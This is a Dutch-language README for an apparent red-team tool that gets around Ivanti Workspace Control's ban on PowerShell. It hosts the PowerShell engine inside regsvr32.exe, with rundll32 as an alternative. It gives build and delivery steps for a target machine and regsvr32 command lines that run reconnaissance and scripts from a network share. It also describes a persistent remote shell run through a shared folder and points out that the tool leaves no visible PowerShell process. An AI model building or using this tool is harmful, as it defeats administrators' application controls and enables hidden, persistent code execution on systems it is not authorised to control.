# psrun - code-exec springboard via regsvr32 (in-process PowerShell)

Ivanti Workspace Control blokkeert `powershell.exe`/`pwsh.exe` als executable.
Deze DLL host de CLR **in het regsvr32.exe process** en draait daar de
PowerShell engine (`System.Management.Automation`). Er wordt **geen** powershell/pwsh
process gestart: alleen `regsvr32.exe` + 2 DLL loads zijn zichtbaar. Geen registry
writes, geen elevation nodig, statische CRT.

## Files

    psrun_host.cpp      native host - CLR in-process (self-contained, geen SDK headers nodig)
    PSRunner.cs         managed payload - PS runspace + arg parsing
    PSRunner.csproj     mac-build voor de runner (dotnet, geen Windows nodig)
    build_host_mac.sh   host bouwen met mingw-w64 (mac)
    build_runner.cmd    fallback: runner bouwen op een Windows box
    build_msvc.cmd      optioneel: alles via MSVC

## Build (100% vanaf de mac)

    # eenmalig:
    brew install mingw-w64
    brew install --cask dotnet-sdk

    # host:
    ./build_host_mac.sh                     # -> psrun_host.dll

    # runner:
    dotnet build PSRunner.csproj -c Release # -> PSRunner.dll

    # deliveren: psrun_host.dll + PSRunner.dll samen in een dir op de target
    #            (PSRunner.dll hoeft pas opnieuw gebouwd als PSRunner.cs wijzigt)

    # optioneel/alt: build_msvc.cmd (MSVC) of build_runner.cmd (op een Windows box)

## Gebruik

    regsvr32 /s /n /i:"-c Get-Process | select -First 5" C:\stg\psrun_host.dll
    regsvr32 /s /n /i:"-f \\srv\stg\task.ps1 -out C:\stg\out.txt" C:\stg\psrun_host.dll
    regsvr32 /s /n /i:"-f C:\stg\task.ps1 -Domain dc1 -UserX" C:\stg\psrun_host.dll

Alternatieve vector, zelfde DLL (als rundll32 wel mag):

    rundll32 C:\stg\psrun_host.dll,RunPS -c whoami

Lange/quoted one-liners: args via env, dan volstaat plain regsvr32:

    set PSRUN_ARGS=-c Get-LocalUser | ft -auto
    regsvr32 /s C:\stg\psrun_host.dll

## Persistente shell (aanraden)

Een keer starten, daarna commands vanaf de mac - de shell draait door in het
regsvr32-proces (state/variabelen/cd blijven bewaard):

    # target (1x, via jouw launch-vector):
    regsvr32 /s /n /i:"-shell C:\stg\sh" C:\stg\psrun_host.dll

    # mac: wiens de gedeelde map; zelfde map als C:\stg\sh op de target:
    export PSRUN_DIR=/pad/naar/Cross-VM/sh
    export PSRUN_TGT='C:\stg\sh'

    ./psrun.sh 'Get-Process | select -First 3'   # -> output direct
    ./psrun.sh '$x=1;$x+41'                      # variabelen blijven
    ./psrun.sh exit                              # shell netjes stoppen

Protocol: `<dir>\NAME.in` (multi-line PS) -> `NAME.out`. `shell.log` = up/down.
Stoppen kan ook door het regsvr32-proces te killen.

## Arg grammar (PSRunner)

    -c <script>            script tekst (rest van de regel)
    -f <path.ps1> [args]   script file; rest = script-parameters
    -out <file>            output path (default %TEMP%\psrun.log)
    -raw                   geen Out-String (raw objects)

Let op: zet `-out`/`-raw` **vóór** `-c`. Gebruik `Write-Output`, geen
`Write-Host` (er is geen host-UI). Een trailing `# comment` in `-c` breekt de
appende `| Out-String` - in dat geval `-raw`.

## Output / troubleshooting

- `%TEMP%\psrun.log` - script output + `=== host: regsvr32 pid N ===` header
  (bewijst in-process; verwacht géen powershell in procexplorer)
- `%TEMP%\psrun_err.log` - native failures (CLR load, PSRunner niet gevonden, ...)
- `hr=0x80070002` bij ExecuteInDefaultAppDomain -> PSRunner.dll niet naast de host
- x64 DLL -> `C:\Windows\System32\regsvr32.exe`
- check imports van de gebouwde dll:
  `x86_64-w64-mingw32-objdump -p psrun_host.dll | grep 'DLL Name'`
  (verwacht alleen kernel32/user32 - geen libwinpthread/libstdc++ deps)

## Aanpassen

- **Payload/logica**: `PSRunner.cs` - herbouw met `build_runner.cmd`.
- **Loader**: `psrun_host.cpp` - CLR startup, arg parsing, entrypoints.

## Notes

- .NET Framework 4.x (CLR v4.0.30319) + Windows PowerShell 5.1 engine - Win7+;
  **geen** afhankelijkheid van PowerShell 7.
- AMSI/ETW en IWC module-regels gelden gewoon (echte PS runspace in-process).
- PowerShell 7 hosting (pwsh, .NET Core) kan later via `hostfxr` - ander
  traject, zelfde concept.
- `regsvr32` zonder `/i` + zonder `PSRUN_ARGS` = silent no-op (load-test).
